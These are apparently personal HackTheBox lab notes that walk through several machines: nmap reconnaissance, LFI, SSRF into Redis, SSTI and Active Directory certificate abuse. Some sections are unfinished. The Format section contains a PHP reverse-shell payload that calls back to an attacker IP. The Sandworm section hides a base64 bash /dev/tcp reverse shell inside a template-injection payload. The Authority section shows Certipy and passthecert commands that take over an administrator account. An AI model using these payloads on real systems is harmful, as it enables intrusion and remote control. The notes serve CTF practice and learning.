## Agile
### Reco
### Weaponisation
### Exploitation
### User flag
### Root flag
![](https://hackmd.io/_uploads/H1N6hTich.png)

## OnlyForYou
> To obtain access we must read various files on the web using an LFI to find a vulnerability in the form. Using the form we can run CERs. To move to a user we must perform a Cypher Injection on an internal website to get the password. And for the escalation of privileges we must modify a file, create a tar.gz and upload it to the Gogs web intera and then download the file using pip3 and thus be able to modify the bash to SUID permissions.
### Reco
1. nmap 10.10.11.210 -sVC
2. dir busting
    - there is a subdomain
    ![](https://hackmd.io/_uploads/rytoaqich.png)
    - add it also to the /etc/hosts

### Weaponisation
1. beta subdomain
    - allows us to download source code
        ![](https://hackmd.io/_uploads/BklH0qoqh.png)
        - When analyzing it we realize that in the / download path if in the parameter image start with 2 points then launch a message that says Hacking detected and makes us a redirect to / list.
            ![](https://hackmd.io/_uploads/HkT9C5iq3.png)
### Exploitation
1. BurpSuite - LFI
    - 
### User flag
### Root flag

## Format
### Reco
1. nmap: `nmap -sVC 10.10.11.213`
    - 22 SSH
    - 80,3000 HTTP
2. add microblog.htb:3000 to /etc/hosts
3. FUZZING - subdomain enumeration
    - app, sunny
        - add these both to /etc/hosts also
4. Website
    - "Contribute here!" in footer -> source code of app.microblog.htb
### Weaponisation
1. LFI
    - we can use ID parameter for LFI
        - create a blog -> edit blog
            - capture req to add the H1/text
                - we can edit the ID paramater for LFI
                    ![](https://hackmd.io/_uploads/SkOVqn0q2.png)
### Exploitation
1. PRO account
    - dashboard page and source code -> something about PRO 
    - assign pro to our session using SSRF
> curl -X "HSET" http://microblog.htb/static/unix:%2fvar%2frun%2fredis%2fredis.sock:testy%20pro%20true%20a/b

- insert the username of registration
2. Uploading reverse shell
    - use this to get RS on target machine + change your blog name
> id=/var/www/microblog/<your_blog_name>/uploads/rev.php&header=<%3fphp+echo+shell_exec("rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2>%261|nc+10.10.14.30+443+>/tmp/f")%3b%3f>
![](https://hackmd.io/_uploads/rJj-j309h.png)

- after visiting the /uploads/rev.php we will get our RS
### User flag
1. Connect to Redis-cli
    - socks config file
        - redis-cli -s /var/run/redis/redis.sock
        - keys *
            ![](https://hackmd.io/_uploads/SyLwo205h.png)
        - hgetall cooper.dooper
            - `cooper:zooperdoopercooper`
2. SSH connect to obtain user flag
### Root flag
1. trying `sudo -l`
    - we can run /usr/bin/licence
        - this file is also readable
            - [Python format function vuln](https://web.archive.org/web/20230624063634/https://podalirius.net/en/articles/python-format-string-vulnerabilities/)
2. Vuln
    - register a user using redis-cli and use the vuln in username to print all variables
        - `HSET test2 username test1 password test first-name` 
        - `{license.__init__.__globals__} last-name test pro false`
            ![](https://hackmd.io/_uploads/S1LOThRq3.png)
    - run /usr/bin/licence as sudo to provision the licence of our "test2" user
        - `sudo /usr/bin/license -p test2`
            ![](https://hackmd.io/_uploads/Hy_na3Rc2.png)
            - we obtained SSH credentials for root
                - `root:unCR4ckaBL3Pa$$w0rd`
3. SSH login as a root to obtain root flag

## Download
### Reco
- `sudo nmap -sVC <IP>`
    - ![](https://hackmd.io/_uploads/SkZBpNRo3.png)
    - 22 SSH
    - 80 HTTP
        - redirect -> add download.htb to /etc/hosts
- website analysis
    - website for uploading && downloading large files
    - upload subsite
        - download.htb/files/upload
    - login && register subsite
        - downlaod.htb/auth/login
        - download.htb/auth/register
### Weaponisation
1. while trying to upload a file with BurpSuite, I found out tha it is an **Express** based website
        - upload the file -> we obtain unique UID and link
            ![](https://hackmd.io/_uploads/H1ZfZSRo3.png)
            - click "Copy Link" button -> small popup window followed by an alert
                - it is a file called copy.js (contains the code for the function, nothing vulnerable)
            - there is also a JWT token withing the download + a .sig cooke
                ![](https://hackmd.io/_uploads/HyJBZrAj3.png)
                - decoded token: 
                `{"flashes":{"info":[],"error":[],"success":[]}}`
    - Download feature
        - redirects us to the link:
            - `http://download.htb/files/download/0623ba64-6749-48a4-9a08-a58658b74852`
                - this could be used to download other files...
                - uploads are probably stored within a /downloads or /uploads folder on the machine
                    - basic LFI with some Express file names...
                        - `..%2fapp.js` worked...
                       ![](https://hackmd.io/_uploads/HJMYk8Cjn.png)
                             - there is package.json as part of the folders too:
 `{
  "name": "download.htb",
  "version": "1.0.0",
  "description": "",
  "main": "app.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1",
    "dev": "nodemon --exec ts-node --files ./src/app.ts",
    "build": "tsc"
  },
  "keywords": [],
  "author": "wesley",
  "license": "ISC",
  "dependencies": {
    "@prisma/client": "^4.13.0",
    "cookie-parser": "^1.4.6",
    "cookie-session": "^2.0.0",
    "express": "^4.18.2",
    "express-fileupload": "^1.4.0",
    "zod": "^3.21.4"
  },
  "devDependencies": {
    "@types/cookie-parser": "^1.4.3",
    "@types/cookie-session": "^2.0.44",
    "@types/express": "^4.17.17",
    "@types/express-fileupload": "^1.4.1",
    "@types/node": "^18.15.12",
    "@types/nunjucks": "^3.2.2",
    "nodemon": "^2.0.22",
    "nunjucks": "^3.2.4",
    "prisma": "^4.13.0",
    "ts-node": "^10.9.1",
    "typescript": "^5.0.4"
  }
}`
                - AUTHOR: **WESLEY**
2. enumerating LOGIN 
    - create a test user && login -> download_session cookie has some more information (decoded): 
    `{"flashes":{"info":[],"error":[],"success":[]},"user":{"id":16,"username":"test123"}}`
    - .sig token is also different
        - signature of a cookie, changes by the extension
3. VULN for COOKIE on websites running Express
    - [cookie-monster](https://github.com/DigitalInterruption/cookie-monster)
    - [nodeJS Express](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nodejs-express)
### Exploitation
1. Blind injection - Cookie monster Brute Force
Lets sum up all facts we obtained:
    - **.sig** ... key for the token structure, needed fot Cookie Monster
    - User is **wesley**, hashes are UNsalted and used directly for auth -> brute forcing could be a way
    - there is **SQL query** that is somehow injectable
    - **cookies are not validated** any way -> it checks whether a `true` condition is returned from `findFirst` from the `prisma` API module...Blind Injection by redirect could be possibility


## Zipping
### Reco
- nmap
    - `nmap -sVC 10.10.11.229`
        - 22, 80
        - not even redirect...
- website
    - three interesting parts
        - contact form (http://10.10.11.229/#contact)
        - work with us upload form (http://10.10.11.229/upload.php)
            - could be valuable for serving exploits...
        - shop with orders (http://10.10.11.229/shop/)
            - orders are simplified - dead end
- Work with us upload form
    - name of the machine should be a hint for us
        - looking for some vuln to upload .zip file on website...
            - [zip vuln](https://effortlesssecurity.in/zip-symlink-vulnerability/)
                - exploit an LFI using symlinks pointed to for example `/etc/passwd` 
### Weaponisation
- Symlinks to exploit LFI
    - test.pdf
        - 
### Exploitation
### User flag
### Root flag

## Sandworm
// 1 - random name
// 2 - {{7*7}} name
// 3 - Payload with RS + netcat
// 4 - obtain login credentials + login through SSH => user flag
### Reco
1. `sudo nmap -sVC <IP> -p0-65535`
    - 22 ssh (OpenSSH 8.9p1 Ubuntu)
    - 80 http (redirect to https://ssa.htb)
    - 443 https

2. website
    - sudo nano /etc/hosts
        - <ip> ssa.htb
    - URL: [ssa.htb](https://ssa.htb)
        - Secret Spy Agency website containing just info + Contact form
            - contact form consists of text to be submitted through PGP-encrypted tip
                - PGP might be the weakness (no other functions on the website)
    - explore possible dirs
        - `gobuster dir -u https://ssa.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -k`
            - ![](https://hackmd.io/_uploads/rJcGHZiO3.png)
                - ssa.htb/pgp => PGP public key
### Weaponisation
3. SSTI possibility (server-side template injection)
    - [guide](https://linuxhint.com/generate-pgp-keys-gpg/)
    - generate PGP key: `sudo gpg --gen-key`
    - export it to the public.key file: `gpg -a -o public.key --export <filled Real name>`
    - `cat public.key`
    - encrypt message "helloworld" using our PGP key: `echo 'helloworld' | gpg --clear-sign`
    - verify, if website accepts our generated PGP key message
        - Public Key (left): generated public key
        - Signed Text: generated PGP message block of "helloworld"
        - ![name=Zihuatanejo ^^](https://hackmd.io/_uploads/rJjzo-od3.png)
        - works fine ==> we can perform SSTI attack
    ![](https://hackmd.io/_uploads/rk3YsWjOn.png)
### Exploitation
4. SSTI attack
    - we can encrypt reverse shell connection inside PGP message
    - [guide](https://www.sobyte.net/post/2021-12/modify-gpg-uid-name/)
    - first of all, delete previous PGP keys
        - gpg --list-keys
        - gpg --delete-keys hacker
        - gpg --delete-secret-keys hacker
        - gpg --delete-keys hacker
        - gpg --list-keys ==> no keys found
    - prepare reverse shell
        - encode RS in base64
            - !!! ifconfig: get your tun inet IP !!!
            > echo "bash -c 'bash -i >& /dev/tcp/10.10.14.98/4444 0>&1'" | base64
            > YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45OC80NDQ0IDA+JjEnCg==
        - payload for the RS:
            - `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45OC80NDQ0IDA+JjEnCg==" | base64 -d | bash ').read() }}`
    - generate new PGP key
        - gpg --gen-key
            - Real name: 
                - `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45OC80NDQ0IDA+JjEnCg==" | base64 -d | bash ').read() }}`
    
    - `cat public.key`
        - for Public Key (left side)
    - echo 'helloworld' | gpg --clear-sign
        - for Message (right side)
    - lets start listening on prepared port 4444
        - nc -nvlp 4444
    - copy the pub key generated w payload into the UID and verify the signature
    - we are inside
5. obtain login credentials
    - search for the login credentials
            - /home => .ssh => ATLAS
            - .config
                - UN: silentobserver
                - PW: quietLiketheWind22
### User flag
6. Login to obtain user flag
    - ssh silentobserver@ssa.htb
        - password: quietLiketheWind22
    - ls
    - cat user.txt
    
## Authority 
### Reco
1. NMAP: `sudo nmap -sVC 10.10.11.222 --min-rate=500`
![](https://hackmd.io/_uploads/HyJFRLSqn.png)
2. SMB running - lets to the enumeration: `smbclient -L 10.10.11.222`
![](https://hackmd.io/_uploads/BJ7lDLIc3.png)
    - lets inspect the Shares
        - smbclient -N //<IP>/<Share>
            ![](https://hackmd.io/_uploads/B1CYvUU53.png)
3. Content of obtained main.yml file
    ![](https://hackmd.io/_uploads/B1NADUL92.png)


### Weaponisation
1. Crack the hashes inside with john or hashcat
> $cat vault*.yml
> $ANSIBLE_VAULT;1.1;AES256
> 633038313035343032663564623737313935613133633130383761663365366662326264616536303437333035366235613437373733316635313530326639330a643034623530623439616136363563346462373361643564383830346234623235313163336231353831346562636632666539383333343238343230333633350a6466643965656330373334316261633065313363363266653164306135663764
> 
> $ANSIBLE_VAULT;1.1;AES256
> 313563383439633230633734353632613235633932356333653561346162616664333932633737363335616263326464633832376261306131303337653964350a363663623132353136346631396662386564323238303933393362313736373035356136366465616536373866346138623166383535303930356637306461350a3164666630373030376537613235653433386539346465336633653630356531
> 
> $ANSIBLE_VAULT;1.1;AES256
> 326665343864353665376531366637316331386162643232303835663339663466623131613262396134353663663462373265633832356663356239383039640a346431373431666433343434366139356536343763336662346134663965343430306561653964643235643733346162626134393430336334326263326364380a6530343137333266393234336261303438346635383264396362323065313438
2. Decrypting hashes

    ![](https://hackmd.io/_uploads/HkV2ZvSqn.png)
    - PW: DevT3st@123 
3. Move to port 8443 and enter the PW extracted from Ansible vault
    ![](https://hackmd.io/_uploads/r1mxfvBq3.png)
4. Download the config file

### Exploitation
1. Edit the YML file -> go to settings section, replace your own LDAP server
    ![](https://hackmd.io/_uploads/SyX4MwHq2.png)


### User flag
1. Start the responder tool and check if this is on

    ![](https://hackmd.io/_uploads/S18oXDBcn.png)
2. Upload the edited YML file on the site and wait for the responder to show with response with PW in plain text
    ![](https://hackmd.io/_uploads/HJeRmvBc2.png)
        - lDaP_1n_th3_cle4r!
### Root flag
1. Run Certify on the machine to find vuln certificates
    ![](https://hackmd.io/_uploads/BkbbEwBq3.png)
2. Use Add-computer from Impacket to proceed
    ![](https://hackmd.io/_uploads/SJmzVDBc3.png)
3. Now use Certipy
    - If you face any error while running Certipy -> run the Certify saved in the /.local/bin dir from your home dir
    ![](https://hackmd.io/_uploads/BkVXCU8q2.png)

> $./certipy req -u RANDOM$ -p Random! -ca AUTHORITY-CA -target authority.htb -template CorpVPN -upn administrator@authority.htb -dns authority.authority.htb -dc-ip 10.10.11.222
> Certipy v4.5.1 - by Oliver Lyak (ly4k)
> 
> [*] Requesting certificate via RPC
> [*] Successfully requested certificate
> [*] Request ID is 17
> [*] Got certificate with multiple identifications
>     UPN: 'administrator@authority.htb'
>     DNS Host Name: 'authority.authority.htb'
> [*] Certificate has no object SID
> [*] Saved certificate and private key to 'administrator_authority.pfx'
> 
> 
> $certipy cert -pfx administrator_authority.pfx -nokey -out user.crt
> Certipy v4.5.1 - by Oliver Lyak (ly4k)
> 
> [*] Writing certificate and  to 'user.crt'
> 
> $certipy cert -pfx administrator_authority.pfx -nocert -out user.key
> Certipy v4.5.1 - by Oliver Lyak (ly4k)
> 
> [*] Writing private key to 'user.key'

4. Now use passthecert
> $python3 passthecert.py -action modify_user -crt user.crt -key user.key -domain authority.htb -dc-ip 10.10.11.222 -target administrator -new-pass
> Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
> 
> [*] Successfully changed administrator password to: sr****************************VK
> 
> $evil-winrm -i 10.10.11.222 -u administrator -p sr****************************VK
>                                         
> Evil-WinRM shell v3.5
>                                                                                 
> *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami

> htb\administrator
    
5. Read the root flag 
